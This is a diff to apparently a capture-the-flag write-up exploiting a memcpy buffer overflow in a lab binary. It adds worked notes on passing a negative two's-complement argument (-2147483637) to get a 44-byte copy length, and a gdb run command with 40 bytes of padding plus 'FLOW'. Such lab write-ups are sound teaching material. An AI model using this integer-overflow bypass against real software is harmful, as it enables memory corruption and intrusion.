@@ -30,27 +30,40 @@ run "9" $(python -c 'print "A" * 40')
 
 The "memcpy" function is vulnerable to buffer overflow
 
+argv1 = 11
+argrv1 * 4 = 44
+
+11 = 1011 in base 2
+
+DWORD = 32 bits
+```
+printf %032d 1011
+00000000000000000000000000001011
+```
+
+```
+00000000000000000000000000001011 = 11
+change sign
+10000000000000000000000000001011 = -2147483637
+
+signed 2's complement
+-2147483637
+```
 
 ```
 unhex 574f4c46 | rev ; echo
 FLOW
 ```
 
-00000000000000000000000000101100 = 44
-change sign
-10000000000000000000000000001011 = -44
--2147483604
-
-10000000000000000000000000101100
-
-
-Decimal from signed 2's complement
--2147483637
-
+```
 r -2147483637 $(python -c 'print "A"*40 + "FLOW"')
 
 i r $ecx
 ecx            0x2c	44
+```
+
+
+
 
 
 
